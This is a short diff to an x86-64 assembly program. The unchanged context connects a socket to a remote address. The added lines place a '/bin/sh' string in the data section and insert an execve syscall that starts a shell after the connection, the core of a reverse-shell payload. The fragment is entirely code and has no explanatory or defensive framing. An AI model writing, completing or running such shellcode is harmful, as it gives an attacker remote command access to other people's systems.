@@ -1,3 +1,6 @@
+section .data
+        command db '/bin/sh', 0
+
 section .text
         global _start
 
@@ -20,6 +23,14 @@ _start:
         lea rsi, [rel sockaddr]
         mov rdx, 16
         mov rax, 42
+        syscall
+
+        ;execve("/bin/sh", 0, 0)
+        mov rax, 59
+        mov rdi, command
+        mov rdx, 0
+        mov rsi, 0
+        mov rdx, 0
         syscall
 
         mov rax, 60
